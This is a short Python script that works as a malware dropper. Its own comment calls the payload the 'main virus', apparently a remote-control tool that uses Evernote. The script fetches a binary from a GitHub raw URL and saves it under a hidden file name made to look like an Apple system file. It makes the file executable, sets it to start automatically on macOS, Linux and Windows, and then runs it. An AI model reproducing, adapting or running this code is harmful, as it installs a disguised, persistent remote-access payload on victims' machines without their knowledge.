from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system
from sys import platform

filename = "com.apple.com.user.core"
localfile = f"{expanduser('~')}/.{filename}"

# download main virus
open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)

system(f"chmod 555 {localfile}")

if platform == "darwin":
    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
elif platform == "linux":
    from os import environ
    if 'zsh' in environ['SHELL']:
        system(f"echo {localfile} >> {expanduser('~')}/.zshenv")
    elif 'bash' in environ['SHELL']:
        system(f"echo {localfile} >> {expanduser('~')}/.bashenv")
elif platform == "win32":
    from shutil import copy
    copy(localfile ,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")

subproc([localfile])
